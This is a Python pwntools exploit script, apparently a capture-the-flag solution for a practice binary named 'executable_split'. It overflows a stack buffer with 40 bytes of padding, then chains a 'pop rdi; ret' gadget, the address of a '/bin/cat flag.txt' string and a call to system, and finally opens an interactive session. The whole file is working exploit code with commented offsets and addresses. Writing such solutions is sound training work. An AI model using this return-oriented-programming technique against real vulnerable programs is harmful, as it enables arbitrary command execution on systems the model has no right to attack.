#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'executable_split')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# Overflow bytes
gadget_location = 0x00000000004007c3 # pop rdi; ret;
new_rdi_location = 0x0000000000601060 # "/bin/cat flag.txt"
system_location = 0x000000000040074b # runs syscall

buffer = b'A' * 32 # 32 bytes of padding to fill up allocated buffer space
buffer += b'A' * 8 # 8 bytes of random to account for the "push rbp;" before "ret;"
buffer += p64(gadget_location) # code location of the "pop rdi; ret;" gadget to return to
buffer += p64(new_rdi_location) # the value we set in rdi during "pop rdi;"
buffer += p64(system_location) # code location of the system function to return to

print(buffer)
io.send(buffer)

io.interactive()
